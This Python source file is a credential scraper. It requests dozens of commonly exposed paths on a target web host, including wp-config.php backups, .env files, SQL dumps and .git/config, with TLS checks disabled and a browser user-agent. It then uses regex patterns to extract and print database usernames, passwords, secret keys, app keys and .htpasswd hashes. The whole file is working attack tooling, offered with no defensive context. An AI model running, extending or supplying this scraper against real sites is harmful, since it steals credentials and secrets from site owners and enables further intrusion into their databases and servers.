"""HTTP config scraper — attempts to fetch commonly exposed config files containing credentials."""

import re
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Common exposed config file paths across different CMS and frameworks
CONFIG_PATHS = [
    # WordPress
    '/wp-config.php',
    '/wp-config.php.bak',
    '/wp-config.php.old',
    '/wp-config.txt',
    '/.wp-config.php.swp',
    '/wordpress/wp-config.php',
    '/blog/wp-config.php',
    # Generic
    '/.env',
    '/.env.bak',
    '/.env.old',
    '/.env.local',
    '/.env.production',
    '/config.php',
    '/config.php.bak',
    '/configuration.php',
    '/config/config.php',
    '/config/database.php',
    '/app/config/database.php',
    '/includes/config.php',
    '/include/config.php',
    '/conf/config.php',
    # Laravel
    '/config/app.php',
    # Joomla
    '/configuration.php',
    '/configuration.php.bak',
    # Drupal
    '/sites/default/settings.php',
    '/sites/default/settings.php.bak',
    # cPanel / hosting
    '/cpanel_defaults.txt',
    '/.cpanel/datastore',
    # Database dumps
    '/dump.sql',
    '/backup.sql',
    '/database.sql',
    '/db.sql',
    '/data.sql',
    '/site.sql',
    '/backup/dump.sql',
    # Other
    '/config.yml',
    '/config.yaml',
    '/settings.py',
    '/local_settings.py',
    '/database.yml',
    '/db/schema.rb',
    # cPanel specific
    '/public_html/wp-config.php',
    '/public_html/.env',
    '/public_html/config.php',
    # Backup plugins (common on WordPress)
    '/wp-content/uploads/wp-config.php',
    '/wp-content/backup-db/wp-config.php',
    '/wp-content/backups/wp-config.php',
    '/wp-content/plugins/backup/wp-config.php',
    # Common backup extensions
    '/wp-config.php~',
    '/wp-config.bak',
    '/wp-config.old',
    '/wp-config.save',
    '/wp-config.orig',
    # Exposed git
    '/.git/config',
    '/.git/HEAD',
    # PHP info
    '/phpinfo.php',
    '/info.php',
    '/test.php',
    # Exposed logs
    '/error_log',
    '/logs/error_log',
    '/php_errorlog',
]

# Regex patterns to extract credentials from file contents
CREDENTIAL_PATTERNS = [
    # WordPress
    (r"define\s*\(\s*'DB_USER'\s*,\s*'([^']+)'", 'db_user'),
    (r"define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'", 'db_password'),
    (r"define\s*\(\s*'DB_HOST'\s*,\s*'([^']+)'", 'db_host'),
    (r"define\s*\(\s*'DB_NAME'\s*,\s*'([^']+)'", 'db_name'),
    # .env style
    (r'DB_USERNAME\s*=\s*(.+)', 'db_user'),
    (r'DB_PASSWORD\s*=\s*(.+)', 'db_password'),
    (r'DB_HOST\s*=\s*(.+)', 'db_host'),
    (r'DB_DATABASE\s*=\s*(.+)', 'db_name'),
    (r'SECRET_KEY\s*=\s*(.+)', 'secret_key'),
    (r'APP_KEY\s*=\s*(.+)', 'app_key'),
    # Generic PHP
    (r'\$db_pass\s*=\s*["\']([^"\']+)["\']', 'db_password'),
    (r'\$db_user\s*=\s*["\']([^"\']+)["\']', 'db_user'),
    (r'\$dbpass\s*=\s*["\']([^"\']+)["\']', 'db_password'),
    (r'\$dbuser\s*=\s*["\']([^"\']+)["\']', 'db_user'),
    (r'\$password\s*=\s*["\']([^"\']+)["\']', 'password'),
    (r'\$username\s*=\s*["\']([^"\']+)["\']', 'username'),
    # Joomla
    (r"public \\\$password\s*=\s*'([^']+)'", 'db_password'),
    (r"public \\\$user\s*=\s*'([^']+)'", 'db_user'),
    # .htpasswd — username:hash pairs
    (r'^([^:]+):(\$apr1\$[^\s]+)', 'htpasswd_md5'),
    (r'^([^:]+):(\$2y\$[^\s]+)', 'htpasswd_bcrypt'),
    (r'^([^:]+):\{SHA\}([^\s]+)', 'htpasswd_sha1'),
    (r'^([^:]+):([a-zA-Z0-9./]{13})', 'htpasswd_crypt'),
]


class HTTPConfigScraper:
    """Fetches commonly exposed config files and extracts credentials from their contents."""

    TOTAL_TIMEOUT = 20  # hard cap to avoid hanging the router
    
    def __init__(self, host: str, ip: str):
        """Initialize with target hostname and IP.

        Args:
            host (str): Domain name for HTTP Host header.
            ip (str): Resolved IP address to connect to directly.
        """
        self.host = host
        self.ip = ip
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})

    def run(self) -> dict:
        """Iterate all config paths, fetch each, extract credentials if found.

        Stops after TOTAL_TIMEOUT seconds to avoid hanging on slow targets.

        Returns:
            dict: Found files and any extracted credentials.
        """
        print(f"\n  [CONFIG] Scraping config files on {self.host}")
        results = {'found_files': [], 'credentials': {}}
        deadline = time.time() + self.TOTAL_TIMEOUT

        for path in CONFIG_PATHS:
            if time.time() > deadline:
                print(f"  [CONFIG] Timeout — stopping early")
                break
            content = self._fetch(path)
            if content:
                print(f"  [CONFIG] *** FOUND: {path} ({len(content)} bytes) ***")
                results['found_files'].append(path)
                creds = self._extract_credentials(content)
                if creds:
                    results['credentials'][path] = creds
                    print(f"  [CONFIG] Extracted credentials from {path}:")
                    for key, value in creds.items():
                        print(f"    {key}: {value}")

        if not results['found_files']:
            print(f"  [CONFIG] No exposed config files found")

        return results

    def _fetch(self, path: str) -> str | None:
        """Fetch path via HTTPS then HTTP with strict per-chunk timeout."""
        for scheme in ('https', 'http'):
            url = f"{scheme}://{self.ip}{path}"
            try:
                r = self.session.get(
                    url,
                    headers={'Host': self.host},
                    timeout=(2, 3),
                    allow_redirects=False,
                    stream=True,
                )
                if r.status_code != 200:
                    r.close()
                    continue

                content_length = int(r.headers.get('Content-Length', 0))
                if content_length > 500_000:
                    r.close()
                    return None

                # Read with a hard byte cap — never trust the server to close
                chunks = []
                total = 0
                for chunk in r.iter_content(chunk_size=4096):
                    chunks.append(chunk)
                    total += len(chunk)
                    if total > 500_000:
                        break
                r.close()
                return b''.join(chunks).decode('utf-8', errors='ignore')

            except Exception:
                continue
        return None

    def _extract_credentials(self, content: str) -> dict:
        found = {}
        for pattern, label in CREDENTIAL_PATTERNS:
            match = re.search(pattern, content, re.IGNORECASE | re.MULTILINE)
            if match:
                if match.lastindex == 2:
                    # username:hash format (.htpasswd)
                    value = f"{match.group(1)}:{match.group(2)}"
                else:
                    value = match.group(1).strip().strip("'\"")
                if value and value.lower() not in ('', 'null', 'none', 'your_password_here'):
                    found[label] = value
        return found